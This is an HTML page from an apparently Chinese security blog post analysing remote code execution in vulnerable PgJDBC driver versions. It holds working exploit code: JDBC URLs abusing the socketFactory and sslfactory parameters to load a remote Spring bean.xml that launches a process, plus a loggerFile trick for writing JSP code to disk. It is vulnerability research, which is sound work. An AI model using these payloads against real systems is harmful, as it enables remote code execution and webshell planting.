@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            JDBC: PGSQL
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        
+        <div id="table-of-content">
+            <ul id="table-of-content-ul">
+
+            </ul>
+        </div>
+
+        <p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p>
+<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>影响范围：</p>
+<p>9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25</p>
+<p>42.3.0 &lt;&#x3D;PgJDBC &lt; 42.3.2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.postgresql&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;postgresql&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;42.3.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;5.3.23&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ClassPathXmlApplicationContext"><a href="#ClassPathXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext"></a>ClassPathXmlApplicationContext</h1><p>首先要知道这个东西可以加载远程配置文件，创建bean。</p>
+<p>运行这一条语句即可弹calc。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:8787/bean.xml&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>bean.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;!--    普通方式创建bean--&gt;</span><br><span class="line">    &lt;bean id=&quot;exec&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;calc&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="socketFactory"><a href="#socketFactory" class="headerlink" title="socketFactory"></a>socketFactory</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    String socketFactoryClass = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="line">    String socketFactoryArg = &quot;http://127.0.0.1:8787/bean.xml&quot;;</span><br><span class="line">    String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg=&quot;+socketFactoryArg;</span><br><span class="line">    Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226220132312.png" alt="image-20240226220132312.png"></p>
+<p>openConnection之前的全部方法，大概看了下，都是初始化。</p>
+<p>在openConnectionImpl中，一定会进入getSocketFactory方法，没有其他限制。</p>
+<p>在getSocketFactory中，若不指定socketFactory，则用Default。若手动指定则会去初始化对象。</p>
+<p>那么指定socketFactory为ClassPathXmlApplicationContext，并且设置好参数，即可加载远程配置文件rce。</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226220359880.png" alt="image-20240226220359880.png"></p>
+<h1 id="sslfactory"><a href="#sslfactory" class="headerlink" title="sslfactory"></a>sslfactory</h1><p>猜测sink点还是ObjectFactory#instantiate，右键，find usage 然后逐层往上找。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SocketFactoryFactory#getSslSocketFactory</span><br><span class="line">	MakeSSL#convert</span><br><span class="line">		ConnectionFactoryImpl#enableSSL</span><br><span class="line">            ConnectionFactoryImpl#tryConnect</span><br><span class="line">                ConnectionFactoryImpl#openConnectionImpl // 这就是入口</span><br></pre></td></tr></table></figure>
+
+<p>分析其中的流程后，最终到达这里：</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226222736682.png" alt="image-20240226222736682.png"></p>
+<p>这里只需要让url参数里的sslfactory为上面的<code>ClassPathXmlApplicationContext</code>，让sslfactoryarg为<code>http://127.0.0.1:8787/bean.xml</code>即可。</p>
+<p>调用栈：</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226222647306.png" alt="image-20240226222647306.png"></p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    String sslfactory = &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;</span><br><span class="line">    String sslfactoryarg = &quot;http://127.0.0.1:8787/bean.xml&quot;;</span><br><span class="line">    String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?sslfactory=&quot;+sslfactory+&quot;&amp;sslfactoryarg=&quot;+sslfactoryarg;</span><br><span class="line">    Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>在<code>ConnectionFactoryImpl#tryConnect</code>中：</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226223054939.png" alt="image-20240226223054939.png"></p>
+<p>他会向pg服务器建立tcp连接，只是建立而已，所以nc监听一下保证这一行不连接超时就行。</p>
+<p>在<code>ConnectionFactoryImpl#enableSSL</code>中，会向pg地址发送几个数据，并获取响应，根据响应的不同进入不同的分支。</p>
+<p>这里只要手动向nc输入一个S字符就可以了。</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226223203286.png" alt="image-20240226223203286.png"></p>
+<p>然后就进入了convert，最后是getSslSocketFactory。</p>
+<h1 id="loggerFile"><a href="#loggerFile" class="headerlink" title="loggerFile"></a>loggerFile</h1><p>可以跨目录写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">    String content = &quot;&lt;%java code%&gt;&quot;;</span><br><span class="line">    String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?loggerLevel=DEBUG&amp;loggerFile=bbbb.txt&amp;&quot;+content;</span><br><span class="line">    Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/jdbc-pgsql/image-20240226232320811.png" alt="image-20240226232320811.png"></p>
+
+    </div>
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('img'); // 选择所有 img 元素
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+
+        var getAllHeader = ()=>{
+            var content = document.getElementsByClassName('post-content')[0].childNodes
+            // var h2 = h1.getElementsByTagName("h2")
+            var result = []
+            var pair
+            for(var node of content){   
+                var tagName = (node.tagName?node.tagName:"").toLowerCase()
+                if(tagName === 'h1'){
+                    if(pair){
+                        result.push(pair)
+                    }
+                    pair = {"h1":node,"h2":[]}
+
+                }else if(tagName === 'h2'){
+                    pair.h2.push(node)
+                }
+
+            }
+            result.push(pair)
+            return result
+        }
+
+        var writeHeader = (headers)=>{
+            var _ul = document.getElementById("table-of-content-ul")
+            for(var p of headers){ 
+                console.log(p)
+
+                var h1_li = document.createElement('li')
+                var h1_a = document.createElement('a')
+                h1_a.innerText = p.h1.innerText
+                h1_a.href = `#${p.h1.id}`
+                h1_li.appendChild(h1_a)
+                var ul = document.createElement('ul')
+                for(var h2 of p.h2){
+                    var h2_li = document.createElement('li')
+                    var h2_a = document.createElement('a')
+                    h2_a.innerText = h2.innerText
+                    h2_a.href = `#${h2.id}`
+                    h2_li.appendChild(h2_a)
+                    ul.appendChild(h2_li)
+                }
+                h1_li.appendChild(ul)
+                _ul.appendChild(h1_li)
+            }
+        }
+        var headers = getAllHeader()
+        writeHeader(headers)
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+
+</html>
